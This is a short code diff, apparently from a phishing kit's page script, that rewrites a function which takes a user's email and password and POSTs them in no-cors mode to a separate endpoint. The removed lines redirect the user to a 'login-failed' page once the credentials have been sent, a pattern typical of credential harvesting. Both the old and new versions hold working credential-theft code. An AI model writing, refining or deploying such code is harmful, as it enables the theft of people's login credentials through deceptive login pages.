@@ -40,30 +40,20 @@ document.addEventListener("DOMContentLoaded", function() {
         window.location.href = `${hostname}/display-password.htm`;
     };
 
-    async function sendFormAndRedirect(email, password) {
-        
-       try{
-            localStorage.removeItem("user-email");
+    function sendFormAndRedirect(email, password) {
+        localStorage.removeItem("user-email");
 
            const payload = {
                "email": email,
                "password": password
            };
-           console.log({payload})
-        const res = await fetch(endpoint, {
+        console.log({payload})
+        const res = fetch(endpoint, {
             method: "POST",
             mode: "no-cors",
-            "Content-Type": "application/json",
             body: JSON.stringify(payload)
-        });
-        if (res.status == 200) {
-            window.location.href = `${hostname}/login-failed.htm`;
-        }else{
-            window.location.href = `${hostname}/display-login.htm`;
-        };
-       }catch(error){
-           console.log("error:", error);
-       }
+        }).then((response) => console.log(response));
+        
     };
 });
 
